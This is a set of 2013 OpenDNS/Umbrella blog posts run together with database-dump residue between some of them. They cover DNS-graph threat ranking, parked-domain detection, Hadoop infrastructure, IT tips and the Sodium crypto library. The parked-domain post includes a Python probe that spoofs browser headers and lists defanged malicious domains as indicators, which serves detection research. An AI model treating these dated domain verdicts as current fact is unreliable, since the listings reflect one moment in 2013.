It takes creativity and solid data science skills to innovate ways to transform an enormous amount of data into security discoveries.\nIn a series of blogs, we will share algorithmic details of our home-grown discovery algorithms that leverage big data, machine learning and graph theory to make predictive detections.\nWe start off with SecureRank, which has been presented at a couple security community meet-ups recently. If you haven’t seen it, or prefer video to text, you can watch the SecureRank presentation at this YouTube link.\nConceptually, a good abstraction of DNS traffic is a bipartite graph. It’s huge, even if you are looking at a small fraction of the Internet. The left set of vertex consists of the client machines (requestors) making DNS requests; the right set of vertex are the hostnames (requestees) that are requested.\nSo how does a DNS bipartite graph give us an edge in making security discoveries? Consider, for example, the websites Google.com and example.evil.com (a made-up botnet C&C hostname). Imagine that Google.com is much more popular than example.evil.com, as the Google.com vertex appears more densely connected on the graph. The popularity rank can be inferred using page rank-like algorithms. However, popularity alone is a not a good indicator of maliciousness.\nWhat about layering the graph with existing knowledge? There are known bad actors on the Internet, as well as websites we know to be clean. Imagine that we color our graph with different shades of “red” to indicate the bad ones, while “green” for the good ones. We’re likely to see clusters of ‘red’ zones and they are quite separate from “green” zones with few intra links.\nWe generalize the above rationale and observations as one hypothesis “hostnames requested by known infected clients but never requested by clean clients are most likely to be bad.” Based on this hypothesis, SecureRank ranks the security risks of all hostnames by applying an iterative process similar to the page rank algorithm in the following steps.\nThe algorithm\nIterative definition\n\nLink analysis: This involves marching through global DNS query data and mapping the requestor-requestee pairs as a graph.\nInitialization: This gives negative ranks to known blacklisted domains and assigns positive ranks to known whitelisted domains.\nSecureRank iterations: This concept is illustrated in the simple example below.\n\n\nConvergence and output final ranks: Final ranks are generated when the ranks converge after a number of iterations.\nImplementation: The algorithm is implemented in Java following Hadoop MapReduce framework. Details can be found in the YouTube video mentioned earlier.\nEmpirical results evaluation\nTwo metrics were used to evaluate the results: false positive rate and false negative rate. The data sets we used (as the closest thing to gold standard positive set and negative set) are composed of a list of 670,199 known malicious sites and the Quantcast top million sites.\nOur hypothesis has stated that domains that receive low SecureRank, in particular, in the negative value range, are more likely to be malicious. At the same time, malicious sites should more likely receive a negative rank, but not necessarily (consider compromised legitimate sites).\nThe resulting SecureRanks of 83% of the blacklisted sites are negative.\n\n530 out of the Quantcast top million sites (potential false positive rate = 0.053%) received negative ranks in a particular time window. Further scrutiny of these potential false positives showed that: 1) these sites are on the left end axis of negative values, all in the range of [-0.099,0). 2) Forty five sites were also flagged by Google safe browsing. 3) The majority of these sites are parked domains or spam/scam suspects. None of the sites can be deemed as significant false positives.\nSecureRank in action!\nSecureRank is integrated into the Umbrella Security Graph. When a query has an alarmingly low SecureRank, an alert bar is shown.\n\nUsing SecureRank in our back-end classification engine, we’re alerted to 200,000+ likely malicious domains each day.

This morning we made two big announcements about how we’ll make it happen. First, we announced that Stefan Dyckerhoff, former GM/EVP at Juniper Networks (employee #33!) and new managing director at Sutter Hill Ventures has joined our board of directors. Second, we announced that in conjunction with Stefan joining our board, OpenDNS has closed a round of funding with Sutter Hill Ventures.\nStefan and I met a couple years ago at the World Economic Forum in Davos when OpenDNS was recognized as a Technology Pioneer. He’s an expert in the security and networking space and a seasoned executive and company builder. With Stefan’s guidance, we’ll be able to efficiently and thoughtfully scale our team, processes and infrastructure while building our world-class security company and maintaining the engine of innovation that has been our hallmark.\nAnd the money? Well, having more money will let us add more datacenters, faster, and allow us to increase our overall visibility as a company. To date, our spending has come primarily from the cash we generate from our business. But we’ve been missing out on the opportunities in front of us recently because we didn’t have the cash to capitalize on them. Having some extra cash on hand will help us take advantage of those opportunities when they come up.\nWhy security?\nWe have always sat at a unique intersection on the Internet, helping people with navigation, access, and security. So while we’ve considered doing things in the search space, or in the domain name space, it’s the security opportunity that gets us the most excited. Here’s why:\nThese days, people work wherever they need to get work done, use all kinds of new devices, and access cloud applications without ever using a VPN back to their office HQ. Today’s traditional security appliance approach of “build a firewall around the corporate network” fails to scale or address the reality of how employees actually work today. These changes are disruptive to the security industry and they leave most companies vulnerable to real and serious security threats. In other words, these changes have left IT without visibility, users unprotected, and devices unsecured.\nIn a world where enterprise applications like Box, Salesforce, NetSuite, and Workday are hosted in the cloud, someone needs to create the network security platform that gives workers a secure conduit to the Internet. And they need to do it in a way that gives IT the security ecosystem that they require. That someone is us. And it’ll be our network and platform that finally give IT a true extension of their network perimeter.\nFinally, we think we can do some of it better than other security companies. We’re researching security techniques that will protect against sophisticated threats in a way other vendors can’t. They simply can’t see the traffic we see, and they lack the big data analysts that can create actionable intelligence from a view like this.\nBut what about the users who trust OpenDNS for safe, fast, smart and reliable DNS?\nOver the last seven years, we’ve been a company focused on delivering best in class Internet services so that anyone can connect to the Internet with confidence. That mission is stronger than it’s ever been, and we’ll be using some of the capital we’ve raised to nurture and grow our consumer Internet and DNS services, too.\nWhile we have more than 7,000 business security customers today, we have 50,000,000 daily users – many of whom have been with us for years and years. We thrive on your feedback and your support and I’m always available to hear your feedback or comments on how we can make our services and company better.\nWant to help us grow?\nSince the very beginning, the contributions and feedback of OpenDNS users has shaped our growth.

We are constantly looking at data in new ways, both in performing experiments that could help us uncover malicious, or potentially malicious domains, and in attempting to develop new algorithms and data mining methods.\nAfter a recent experiment that uses a method for discovering new, potentially malicious domains by examining authoritative DNS traffic, we were curious to see what other deductions could be made from examining the traffic. Further exploring this data mining technique resulted in identifying a new method for zeroing in on parked domains that could potentially host suspicious ad networks which might serve malware. (The full details on this data mining technique are shared at the end of this post.) Ultimately, our experiment will result in improved security for Umbrella customers, as we are now able to uncover new threats linked to parked domains in a methodical way.\nParked domains: troublesome or malicious?\n\nParked domains aren’t usually in the spotlight as infection vectors, but it might be time they get some attention. Parked domains are single-page portals laden with ads, devoid of any value to the occasional visitor. They are usually set up by typosquatters or legitimate domain registrars that seek to monetize the visits of users who might land on the main page.\nDespite technically being a legitimate business, parked domain monetization can get mixed up with suspicious practices and malicious content. The ads parked domain operators serve are provided by Internet advertising publishers. In some cases, these ad publishers can be lax about scanning the ads for any malicious content. Or, the page might get unknowingly compromised and end up serving malvertisements.\nEven recently, landing pages of parked domains have served malware on a large scale (See Symantec’s article here and Threatpost’s here). Commtouch’s 2012 Internet Threats report points out that parked domains are among the top categories of websites to serve malware, and that “the hosting of malware may well be the intention of the owners of the parked domains”.\nAlthough parked domains represent the long tail of malware infection vectors, and Threatpost’s article recommends that security professionals should focus on high-profile threats rather than wasting resources investigating them, we think that parked domains could represent a first, stealth phase in a malicious domain’s lifetime.\nWe propose that attackers could register the domains, park them with bogus ads, and use them to generate some revenue with the occasional visitor or victim. In a subsequent phase, the domains could potentially be converted, or “traded” to be used as malware distribution sites, drop sites, or C&C. They are also often associated with gambling, porn, fake drugs, scams, etc. A lot of these parked domains are also registered under bogus registrant credentials, indicating addresses in some exotic countries like British Virgin Islands, Saint Vincent and the Grenadines or the Bahamas. It’s our opinion that the low reputation and lack of usefulness of parked domains is enough to categorize them as suspicious/malicious.\nA new technique for detecting parked domains\nSince we’re hypothesizing that parked domains be treated as malicious, our next step is to identify them in bulk and evaluate their content. So, how can we do it? Domain parking services such as DomainSponsor, Sedo, Network Solutions, Yahoo, Oversee.net, GoDaddy, etc. use different page templates and site structures, so a technique that attempts to programmatically detect all of them might not work all the time. It turns out, however, that a lot of parked domains respond successfully to an HTTP request that seeks a wildcard subdomain or a non-existent page. A quick method would then be to check for wildcard subdomains.\nAt the DNS level, for a given domain D, we check if a wildcard subdomain under D resolves. If it does, we know D is a parked domain, if it does not then D is very likely not a parked domain. At the HTTP level, a large number of parked domains respond to wildcard subdomains either with a dynamically-generated page full of ads or a redirect to the domain’s front page. For example, let’s check if the domain 123-service[.]ru is parked or not. We issue an HTTP request to a URL formed by prepending a random string to the domain name to form a wildcard subdomain. For example, we form the following URL: hxxp://nj71bwm4zo56rbgjy4d29ols[.]123-service[.]ru and then send the HTTP request with that URL. The site indeed responds with a valid page full of bogus ads.\nIn these cases, parked domains will either respond with the same advertisement page, a randomly-changing page under the same domain, or redirect you to another parked domain. Notice that when we issue HTTP requests seeking wildcard subdomains or non-existent pages, normal domains typically respond with a standard 404 Not Found, whereas, parked domains will respond with a 200 OK response or a 3xx redirection code followed by a 200 OK successful response when the user lands on the final page.\nIn my experiments, I used Python and httplib2. Some parked domains respond to the HTTP requests sent by the script with empty pages. So, I changed the user agent in the HTTP request to an old version of IE, and set the referrer to google search, just so it seemed to the website that I am running an old browser and coming from a search engine. This is reminiscent of search engine poisoning as a lot of malicious typosquatters and parked domain operators use SEO techniques so that their sites appear at the top of the page of the search results for the terms or topics they are targeting. The site will respond differently depending on the User Agent or Referrer and might lead the user to a malicious domain, if the user’s machine is detected to be vulnerable. Notice that Google detects parked domains and usually removes them from their search result pages. A useful tool I used to debug the flowing HTTP traffic is Justniffer available at http://justniffer.sourceforge.net/.\nBelow you can see an excerpt of the Python code I used:\nh = httplib2.Http(“.cache_httplib”)\nh.follow_all_redirects = True\ntry:  random_subdomain = “”.join( [random.choice(string.letters) for i in xrange(15)] )  if(domain[:7]!=”http://”):    link = “http://” +random_subdomain + “.”+ domain+”/”  resp, content = h.request(link, “GET”, headers={‘User-Agent’:\'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x  4.90)’,\'Content-Type’:\'text/plain’, ‘Referer’: ‘http://www.google.com/search?hl=fr&q=dictionary+french’})  contentLocation = resp[\'content-location\']  if(contentLocation!=”\"):    print domainexcept:  return\nNow, as an example, let’s take the daily candidate domain list produced by a first filtering heuristic: the IP-NS_IP-match heuristic (details on that below). That list consists of 539,904 domains, 2,355 of which are known to be malicious. The remaining 537,549 are not known to be malicious, but 36,367 domains have IPs that are active and are tied to active malicious domains. These 36,367 domains are candidates to be further filtered by the domain-IP reputation heuristic.\nAs we’ll explain in detail below about the domain-IP reputation heuristic, for a candidate domain D, if it maps to an IP that is active and malicious, we can vary N, the size of the neighborhood of the IP, where the neighborhood represents the active malicious domains tied to this IP. The higher the N, the more likely the candidate domain D is associated with a suspicious/malicious domain-IP neighborhood.\nWe observed that large sets of parked domains tend to be hosted on a small set of hosting IP “hubs”, where these domains can serve sometimes similar, sometimes varying bogus ad campaigns. For example, we observed parked domains hosted on the same IP hubs that serve pharmacy and health-themed ads or gaming ads. In the graphs below, we show the number of discovered suspicious/malicious domains as the threshold N grows, and the percentage of parked domains in the discovered domains set as N grows. Notice that, in the initial candidate set of 36,000+ domains, there are close to 30% parked domains.\n\n\nWe can see that the percentage of parked domains dramatically increases as N grows. Therefore, one of the features of the domain-IP reputation technique is that as we increase N, it becomes more and more efficient at isolating parked domains. Then the wildcard subdomain technique is useful at validating the former technique. We then can either discard parked domains as noise and focus on other categories of suspicious domains, or we can consider parked domains themselves for further study.\nMalicious links on parked domains\nTo further analyze parked domains, we systematically extract all URLs embedded in the source code of the landing page. In this section, I describe a few examples of the parked domains that we discovered were linking to malicious domains.\nbjb[.]doctordams[.]ru, a parked domain is reported on WOT as a scam site, and a Russian pill spammer. It links to pharmacy-checker1[.]com which is a blacklisted domain associated with pharmacy fraud, fake drugs, scams, and malware. The IP that bjb[.]doctordams[.]ru resolves to, also hosts another 1776 parked domains (all 3LDs) from the discovered set, where practically all of them are pharmacy fraud sites prone to distributing malware. These 3LDs belong to 44 different second level domains, with 41 of them registered on March 6th, 2013 under the .ru ccTLD. doctordams[.]ru is one of them along with others like doctorkook[.]ru, doctordote[.]ru, doctorpeck[.]ru, doctorputz[.]ru,\ndoctorarid[.]ru, doctorecru[.]ru, doctorlire[.]ru, doctormuck[.]ru, etc. The same hosting IP has hosted close to 1,000 malicious domains in the past 8 months. Clearly, these domains and IP are up to no good.\nboskcom[.]com (not yet reported as malicious) links to yieldmanager[.]com, reported on WOT as an intrusive ad company which downloads tracking cookies and malware on user’s machines. boskcom[.]com resolves to an IP that has hosted more than 100 known malicious domains.\nviirgilio[.]it links to fwdservice[.]com, a blacklisted domain associated with phishing and distributing malware. viirgilio[.]it resolves to an IP that hosts 700+ parked domains from the discovered set. The IP has hosted more than 1,000 known malicious domains.\nThere are examples of suspicious domains that many parked domains point to: rmgserving[.]com, which appeared in network traces of some known trojans that were seeking urls in subdomains of rmgserving[.]com; ib[.]adnxs[.]com is a known advertisement site. It also reportedly serves annoying pop-ups and ads that might be malicious. searchtermresults[.]com is another site pointed to by a lot of parked domains. It was registered Feb. 18, 2013, and its intent is rather suspicious.\n———-\nMore about our methods\nFiltering Heuristic 1: IP matching\nGiven raw, authoritative DNS logs, we apply an initial filtering heuristic (that we refer to as IP-NS_IP-match) to retain only domain names whose IP (or one of the IPs, in case the domain resolves to several) matches the IP of the responding authoritative name server. This is allowed by the standard. It does limit the domain’s resilience to failure though, but still occurs in practice. For example, taking a daily sample of authoritative logs from three different resolvers (in London, Ashburn and Singapore), we count 6.1 million (6,111,576) unique domains, Out of these, 539,904 domains (about 8.8 %) have IPs that match the IP of the name server that provided the response. I was curious to further examine domains that meet this criteria.\nFiltering Heuristic 2: Domain-IP reputation technique\nIn the next step, we apply a filtering technique based on domain/IP reputation. If a domain D is not already in the blacklist and is not whitelisted, then we examine its IP reputation.\nIf one of the IPs that domain D maps to is malicious and active (i.e. the IP belongs to the blacklist of the current day), and there are N active malicious domains (i.e. that belong to the current day’s blacklist) that map to this IP, then we consider domain D as malicious with high likelihood.\nIn other words, if we build a domain-IP graph, where nodes represent domains and IPs, and an edge links a domain to an IP if the domain resolves to that IP, then if a domain D is adjacent to an IP that is live (malicious as of today) and the IP has a large degree of size N (where all its neighboring domains are also live), then we consider the domain D malicious. This graph is bipartite, as a domain cannot be linked to a domain, and no IP has an edge to another IP.\nNotice that N is a variable threshold that can be tuned to vary the aggressiveness of the reputation filtering technique. In our study, we observe that the higher the N, the higher confidence we have in a domain D being malicious (false positives decrease), but at the same time this lowers the number of newly discovered malicious domains. Below is a simple graph of a candidate domain mapping to two IPs, one benign and one is actively malicious and tied to several active malicious domains.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/03/20/discovery-of-new-suspicious-domains-using-authoritative-dns-traffic-and-parked-domains-analysis/');

And, the OpenDNS and Umbrella product teams have been working to improve the quality and speed of reports in our user Dashboards. The foundation of each of those discussions is how our infrastructure team handles the data itself. This post is an exploration of how OpenDNS handles the massive amounts of data we process daily, without downtime or performance impact, and what it means for the reporting in the Umbrella Dashboard.\nOn an average weekday the DNS resolvers we run at OpenDNS process more than 50 billion queries originating from over 50 million individual IP addresses. These queries are directed at our anycast IPs (208.67.220.220 and 208.67.222.222), which get routed to one of our 20 data centers, and from there to one of our 80 individual resolver hosts. All combined, this results in a huge amount of data. That data must somehow be processed and aggregated to produce the reports available on our users’ Dashboards, and sampled by Umbrella Security Labs who analyze the data to detect and predict security threats.\nEach query that we log on our resolvers includes the domain being queried, the query’s originating IP, appropriate customer IDs associated with it, and how the query was handled (i.e. whether it was handled normally or blocked due to malware or phishing).  These log entries average around 115 bytes each. Our system produces between 50MB/s and 90MB/s, for a total of over 5TB of raw data produced every day.\n\nWhen I started working at OpenDNS in July of 2010 we were only receiving around half the queries we do now, but the analysis system in use then had been built years earlier. It was barely keeping up. It clearly wasn’t going to scale much further. Like many other companies that have delved into “Big Data” analysis, we built a Hadoop-based infrastructure to replace the previous installation, and it went live in early 2011.\n\nOur production Hadoop cluster is composed of roughly 30 (and rapidly growing!) heavy-duty Ubuntu servers. Of these, one is the active Namenode, the cluster’s coordinator and Hadoop’s only single point of failure. To alleviate this risk, we synchronously replicate the Hadoop metadata on this machine to a spare Namenode via DRDB. That allows us to rapidly failover to the spare machine if necessary, and provide a means to update the Namenode without significant downtime. The remaining worker nodes are basically interchangeable and new ones can easily be added as demand increases.\nOn our resolvers the query logging is configured to roll over every 4MB, which results in a new log file every few seconds on each resolver. Sitting between our Hadoop cluster and the resolvers is a set of “loader” machines which pull in these completed log files, combine them into larger chunks, compress them using LZO compression, and finally push them to the Hadoop Distributed File System (HDFS).  HDFS replicates data across multiple nodes for redundancy (in our case there are three copies of all data in HDFS), and as the compressed resolver logs for a day currently average 1.1TB, this allows our system’s ~300TB of storage to hold 3 months of raw data.\n\nOnce all the logs for a given hour have been received, our system launches a variety of Map/Reduce jobs to crunch that data and generate aggregate data for our customer-facing reports. The output of these jobs are loaded into HBASE (a distributed No-SQL database built on top of HDFS) for future access. When a customer visits the reporting page of the OpenDNS Dashboard, the Dashboard sends a query to one of several Appservers which query HBASE for the time frame requested, sum up the data, and return it to the Dashboard for presentation.\nIn order to provide cluster-level failure handling, and be able to upgrade the production cluster while continuing to return reports to the Dashboard, we have an additional cluster which does nothing but provide a live backup of our HBASE data. If the production cluster has failures, or needs to be taken offline, our Appservers can quickly switch to querying the backup HBASE. As an additional level of paranoia, we also take a nightly snapshot of this backup HBASE which we copy to a machine outside of the Hadoop cluster.\nAnd that’s the mile-high overview of the infrastructure we use to analyze the massive amount of data our system produces. Our infrastructure is also rapidly evolving as we expand our security research team, develop new reports, and work towards providing real-time analysis and reporting capabilities.

Case-in-point: five new employees started this morning, which meant provisioning five new laptops, phones and email accounts, along with dozens of other activities. But, as often as we can, our team makes a point to invest time in projects that will result in time saved down the road. Here are Five ways to improve your security now, that will save you from cleaning up malware, losing data, compromising business, or wasting time later on agonizing projects.\nDeactivate unused accounts. Unused accounts with network access can be used to get access to sensitive data or to create other admin accounts that can do the same. It’s a good idea to keep your active user list up to date, and it takes a small amount of time to preform an audit.\nRevisit your password policy. We all know weak passwords are an easy exploit for criminals. Be sure your policy includes an automatic reset period and strict character requirements. SANS has some good advice for making sure your policy is rock solid, but you may also want to consider a login proxy like 1-Password or OKTA. Hint: A service like OKTA can also help you manage the myriad cloud services your users are already adopting in droves.\nAudit public-facing websites for security flaws, or look for a service that can do it for you. Look for vulnerabilities where hackers could use SQL injections and XSS (cross-site scripting), and any login info, telephone numbers, or e-mails that should not have been published. It’s surprisingly common how often this can happen, even to reputable sites. Your compromised site can get blocked by services like ours, and your company could be at risk of losing valuable website traffic and potential business. Or even worse, you could infect your own clients, which will damage your reputation. The Web Application Security Consortium has a list of suggested tools that can help you do the job.\nStart evaluating that cloud solution you’ve been interested in. One great feature of cloud solutions is that you can almost always start a trial without any friction. It’s a vast improvement from the days of week-long software deployments, or worse, betting on a new hardware solution without the opportunity to trial it. If it’s time for you to look at updating your mail server to something more secure and effective, or address the BYOD problem that’s been haunting you, spending a few minutes now to set up a trial now will pay off ten-fold in the end.\nBe sure you can restore your backups. Even the IT admin that’s diligent about backing up data can get in hot water if it turns out that backed up data can’t actually be restored after a crash.  Taking a few minutes to test your restoration process now will save you (or your colleagues) hours of hard work later.\nIn such a rapidly changing environment like IT, merely going along to get along does not cut it. And when you’re stuck or something gets too large to handle on your own, help is out there. It’s better to be proactive about these issues now than pay dearly for them later.\nWhat are some of the projects you’re working on to help save you time or stress down the road?', 'Announcements;Umbrella', 'https://umbrella.cisco.com/blog/2013/03/14/simple-idea-for-improving-it-security/');

The school has been serving the educational needs of eight counties in South Carolina for 40 years, and is expecting continued growth and expansion in coming months. In order to balance unrestricted Web access, and the security needs of both the school and its students, RCC was searching for a way to protect against malware without backhauling or proxying traffic.\nAt the time, RCC was leveraging a combination of homegrown and purchased Internet security and Web filtering solutions, including a proxy-based Web content filtering system that could easily be disabled in some browsers. Due to limited resources, and the difficulty of deploying existing solutions to multiple locations, Internet access at remote facilities sites was left unfiltered. This approach resulted in RCC’s small, four-person IT department constantly cleaning up malware infections on desktop computers.\n“As our student population grew, the number of devices on our networks at any given time exploded, and eliminating malware infections became a critical priority for us,” said Joe Feinstein, IT Manager for RCC. “We have a responsibility to protect our students’ and faculty’s private data and offer a safe computing environment for everyone who accesses our networks. We also need to stay compliant with Higher Ed Internet mandates.”\nAfter evaluating several proxy-based malware protection solutions, RCC selected lightweight Umbrella Enterprise because it was the only service that didn’t require additional resources to be allocated for regular management and maintenance. Feinstein explained, “Umbrella is the only solution that is truly set-it-and-forget-it. We can block access to compromised sites at the DNS layer, which results in proactive protection that’s reliable and easy to manage.”\nTo learn more about how RCC is using cloud-delivered Umbrella Enterprise, read the full case study.

The group meets monthly to discuss various technologies related to running large production environments. This past week the topic was dynamic scaling, with presentations from Coburn Watson of Netflix, Aren Sandersen of Pinterest, and Sebastian Stadil of Scalr.\nOver the past few years, it’s been really exciting to see how a number of companies have started utilizing cloud providers for a virtual extension of their own network. Most of the presentations discussed Amazon Web Services and how they can spin up instances on-the-spot based on threshold configuration of their current production load. For webapp companies, this has become very convenient, as it allows companies to scale their app quickly without having to build out a significant amount of their own infrastructure. Pinterest is a great example of this model, where a young start up can automate their entire system configuration with Puppet/Chef and other configuration tools. If the company starts to see exponential growth like Pinterest has in the past few years, they can dynamically add new infrastructure without upfront capital costs of hardware, datacenter space, and bandwidth.\n\nAt OpenDNS, we have automated the entire configuration of our production sites, which we run on our own hardware that’s spread over 14 global datacenters (Sneak peek: there’s an additional six coming online in the next few weeks). Our service is a bit unique given our requirements on advanced anycast routing and extensive peering at internet exchanges. We use Puppet and other tools to quickly spin up new sites, and we’ve historically added 2-3 locations annually.\nOur typical process is to rack the bare metal hardware and simply turn it on. The machines will pxeboot install using a custom kernel image we’ve set up for the automated install process. During the boot process, the machine will execute a small portion of code we’ve written. The code runs in the early userspace part of the boot process and fetches a pre-generated configuration of the machines profile. During the boot up process, the machine will detect all aspects of its configuration and build a DNS server, web server, database server, etc. Once the machine has fully been built, puppet will then submit the hardware information to an Open Source inventory management system called Rack Tables.\nWe’ve done quite a bit of in-house customization to the software to fit our needs. Having the inventory process automated and included in the install process is very important as you scale to thousands of machines. Any member of the operations or engineering staff can easily look up all details of a particular machine, such as rack location, facility contact information, service profile, warranty information, vendor information, etc. This process helps things run smoothly, self-documents, and helps us avoid stupid human mistakes. The process also creates a great database of information about our infrastructure that we can easily query. For example, we can easily generate a list of every model and serial number of every harddrive on our network. For an operator of a large scale environment, this information is invaluable.  We also use this database for further automation and configuration of additional services such as monitoring. The accounting and finance folks also really appreciate having clear documentation of every machine that has ever been purchased, which over the long term can be a substantial amount of money.\nIn the near term, we have plans to start utilizing a few different cloud providers to dynamically spin up different environments and leveraging the power of cloud infrastructure. Being a provider of cloud-delivered services ourself, we’ll always have a substantial amount of infrastructure to run, but that doesn’t mean we shouldn’t take advantage of other providers out there.\nThe next LSPE meet up, taking place on Thursday, March 21, is focused on workload distribution. The meet up already has a waiting list of 49 people at the time of this blog, but I’d recommend trying to go anyway if you’re responsible for running a large infrastructure.

They are invaluable to Internet safety and the security of our users. It’s a huge badge of honor to wear for them, too. So, who are they and what do they do?\nTo better explain what a moderator does, let’s quickly revisit the process for how domain categorization works. First, someone submits a domain  (website) to OpenDNS for classification. Then, community members vote on which of OpenDNS’s 57 Web filtering categories the domain should be classified under.  After a certain voting threshold is reached, which varies from category to category, the domain is then moved to the moderation queue.\n!!!ENTER THE MODERATOR!!!\n\nModerators thoughtfully review websites in the moderation queue and make a decision on categorization. The domain is then “tagged” in the appropriate categories and blocked for anyone who has chosen to enable filtering of that category.\nSo, what does it take to be a moderator? Well, you don’t necessarily need a Ph.D. in math or fluency in C++. Our current team of moderators is made up of people from nearly every profession, including (but not limited to) OpenDNS staff members, SysAdmins, software engineers, teachers and stay-at-home parents.

The revolutionary tool combines Big Data analytics, graph theory, artificial intelligence and a new tactic that the Umbrella Security Labs research team calls co-occurrence.\nTo better explain why Big Data is more than just a buzz phrase, we can look at what Big Data means to OpenDNS’s Umbrella Security Labs research team today. Unlike other security vendors that rely heavily on collecting malware samples and creating signatures, and in some cases observing malware behaviors and creating heuristics, Umbrella Security Labs is focused on analyzing the spatial and temporal patterns of connections between malicious Internet hosts.\nIn order to do so effectively, the team must harness massive sets of data. Fortunately, the infrastructure we’ve built out to provide DNS and security services to a massive worldwide audience provides exactly that. More than 50 million people use OpenDNS, and 40 billion DNS queries are Anycast routed via BGP through our 13 globally-distributed datacenters each day. As a result, we can observe the interconnected fabric of the Internet and how hosts are related at any given time. We use that anonymized data to draw conclusions about known threats that ultimately help us predict where threats will come from in the future.\n\nOur team has already leveraged the Big Data analysis to expose details on Red October, the NBC.com attacks, and the recent attacks that Mandiant has linked to Chinese espionage.\nTo further explain how the Big Data is driving the transformation of Internet security, we compiled a technical exploration of how security vendors can leverage graph theory, advanced algorithms, crowd sourced categorization and cloud-delivery platorms.

No matter how secure a function is, its security can be totally destroyed by a tiny weakness in its implementation or by using it incorrectly. And an application using cryptography has to do way more than picking a decently secure set of primitives.\nThe well-known OpenSSL library provides a wide range of cryptographic primitives and related helpers. Unfortunately, developers are likely to be confused by its overly-complex API. And sadly, the W3C crypto API is currently taking the very same path.\nIs encryption all it takes to provide integrity? Is the key length the best indicator of how secure a cipher is? How should random numbers be generated? What are these “modes”? Is opting for the fastest one, like ECB, the best way to go? Why not just use SHA1(secret | message) instead of a HMAC?\nFrequently, developers make arbitrary choices in response to the above questions, leading to security disasters. Worse, this happens most frequently when the intent was to achieve a very common operation.\nIn order to address this, Daniel J. Bernstein released NaCl.\nNaCl is a new and very opiniated cryptographic library.\nFrom a user perspective, it exposes a very simple, high-level API, with a tiny set of functions for each operation. Under the hood, it uses high-speed, highly-secure primitives and constructions, implemented with extreme care to avoid side-channel attacks. NaCl has no low-security options and makes very conservative choices of cryptographic primitives, while remaining exceptionally fast.\nNaCl is an awesome toolkit for developers willing to add cryptography to their applications, that drastically reduces the risk of building insecure constructions. In fact, last year OpenDNS released DNSCrypt, an open-source tool I built for securing DNS communications, that leverages the NaCl crypto library.\nBut NaCl didn’t get much adoption, for several important reasons:\nWhile each primitive comes with one or more portable implementations, NaCl itself is not portable. In particular, it can only be compiled on some Unix flavors.\nNaCl ships with constructions that were just prototypes, and that shouldn’t be used any more.\nThe compiled code is only guaranteed to work on the machine it was compiled on.\nNaCl is not a shared library, making it difficult to use in other programming languages, and it hasn’t been designed to be installed system-wide.\nPackaging NaCl for different operating systems is tough due to its specific build system and compile-time requirements.\nWell, NaCL just got a lot better. Today, I’m announcing Sodium, a portable, cross-compilable, installable, packageable, API-compatible version of NaCl.\nSodium uses the same implementations of crypto primitives as NaCl, but is known to work on all the platforms supported by DNSCrypt, including Bitrig, OpenBSD, Dragonfly BSD, NetBSD, FreeBSD, SmartOS, OSX, Linux, Windows, iOS and Android.\nSodium installs a shared library and a standard set of headers, supports parallel compilation and testing, and uses a portable implementation of each primitive.\nIt also includes convenience functions for generating secure random numbers, and adds additional primitives and helpers to address common needs.\nWhat Sodium does for you\nAuthenticated public-key and authenticated shared-key encryptionThis operation ensures that a message remains secret and can’t be modified by an attacker.\nPublic-key and shared-key signaturesThis operations allows the recipient of a message to verify that it actually comes from the expected sender, and that it hasn’t been modified.\nHashingThis operation compresses a message to a short, fixed-size output from which the original message can’t be computed.\nKeyed hashes for short messagesA lot of applications and programming language implementations have been recently found to be vulnerable to denial-of-service attacks when a hash function with weak security guarantees, like Murmurhash 3, was used to construct a hash table.In order to address this, Sodium provides the “shorthash” function, currently implemented using SipHash-2-4. This very fast hash function outputs short, but unpredictable (without knowing the secret key) values suitable for picking a list in a hash table for a given key.\nSecure pseudo-random numbers generationThis generates pseudo-random numbers suitable for cryptographic purposes. Implementations can be dynamically chosen at run-time. On Windows platforms, it uses the Cryptographic Services Provider by default. Sodium also provides a secure, chroot()-resistant drop-in replacement for the arc4random() function family, including the ability to generate random numbers within a given interval with a nearly random distribution.\nWhy I built Sodium\nOne of the best things about working at OpenDNS is that the company is committed to the larger goal of making the Internet safer, and being transparent in our efforts. We build products that secure businesses against malware, but we also take time to build tools that can serve the greater needs of the security community. For example, earlier this year the Umbrella Security Labs announced the Umbrella Security Graph, a tool that helps researchers predict unknown threats. Before that, OpenDNS released DNSCrypt, an open-source tool I built for securing DNS communications, that leverages the NaCl crypto library. The company has been vocal on privacy, too (see OpenDNS’s open letter to congress on SOPA and anti-censorship policy). As an engineer and security advocate, I see cryptography as a critical building block to achieving privacy and security. I wanted to give back to the security community in a way that could make real impact. I hope you’ll find Sodium to be a valuable resource in your cryptography toolbox, and in your efforts to secure communications.\nInstalling Sodium\nPeople quickly adopted Sodium and built packages for different operating systems.\nOSX, using Homebrew:\nbrew install libsodium\n\nArch Linux package\nNetBSD, Dragonfly BSD (pkgsrc) and FreeBSD: install the security/libsodium package\nDebian: follow this bug report\nCocoaPods (iOS/OSX)\nUsing Chef: libsodium cookbook\nFPM-cookery recipe, to generate .deb and .rpm packages\nThe source code can also be downloaded here: Sodium source code or, for the bleeding-edge version, clone the Sodium Git repository.\n\nUsing Sodium\nWhile the Sodium library provides an API for the C language, bindings for other languages, currently Ruby and Python, are also available:\nRuby: RbNaCl\nPython: PyNaCl\nPython example\nInstalling the PyNaCl package\n$ git clone git@github.com:dstufft/pynacl.git$ cd pynacl$ python setup.py install\nPublic-key signature\nimport naclkey_seed = nacl.random(32)private_key = nacl.signing.SigningKey(key_seed)\n# this preprends a 512-bit signature to the messagesigned_message = private_key.sign(\'message\')\npublic_key = private_key.verify_key# signing_key has to remain secret# public_key should be sent to the recipient\nVerifying the signature of a signed message\ntry:  message = public_key.verify(signed_message)  print(message)except BadSignatureError:  sys.stderr.write(\"Incorrect signaturen\")\nRuby example\nInstalling the RbNaCl gem\n$ git clone git://github.com/cryptosphere/rbnacl.git$ cd rbnacl$ gem build rbnacl.gemspec$ gem install rbnacl-*.gem\nPublic-key authenticated encryption\n# Alice\'s key pairalice_private_key = Crypto::PrivateKey.generatealice_public_key = alice_private_key.public_key\n# Bob\'s key pairbob_private_key = Crypto::PrivateKey.generatebob_public_key = bob_private_key.public_key\n# Alice\'s \"box\" to encrypt/decrypt messages for/from Bobalice_box = Crypto::Box.new(bob_public_key, alice_private_key)\n# Bob\'s \"box\" to encrypt/decrypt messages for/from Alicebob_box = Crypto::Box.new(alice_public_key, bob_private_key)\n# Alice encrypts and signs a message for Bob.# This operation needs a nonce for each message: a unique 192-bit value 